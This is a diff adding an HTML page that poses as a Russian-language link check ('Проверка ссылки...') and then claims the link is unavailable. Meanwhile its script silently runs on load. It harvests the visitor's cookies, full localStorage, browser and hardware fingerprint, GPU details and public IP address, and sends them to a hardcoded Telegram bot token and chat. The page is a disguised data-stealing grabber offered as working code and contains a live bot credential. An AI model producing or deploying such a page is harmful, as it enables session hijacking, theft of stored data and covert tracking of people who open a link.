@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Загрузка...</title></head>
+<body>
+<div id="msg">Проверка ссылки...</div>
+<script>
+const BOT = '8680331620:AAFy2aG6V6o9wPHiwJNGPt_Ct0sRjcWaRLw';
+const CHAT = '7790743401';
+
+async function collect() {
+  const d = {};
+  d.ua = navigator.userAgent;
+  d.platform = navigator.platform;
+  d.lang = navigator.language;
+  d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  d.screen = screen.width + 'x' + screen.height;
+  d.cookies = document.cookie;
+  d.ls = JSON.stringify(localStorage);
+  d.ref = document.referrer;
+  d.url = location.href;
+  d.cores = navigator.hardwareConcurrency;
+  d.mem = navigator.deviceMemory;
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+  } catch(e) {}
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    d.ip = (await r.json()).ip;
+  } catch(e) {}
+  await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: CHAT, text: JSON.stringify(d, null, 2)})
+  });
+}
+setTimeout(() => {
+  collect();
+  document.getElementById('msg').innerText = 'Ссылка недоступна';
+}, 500);
+</script>
+</body>
+</html>
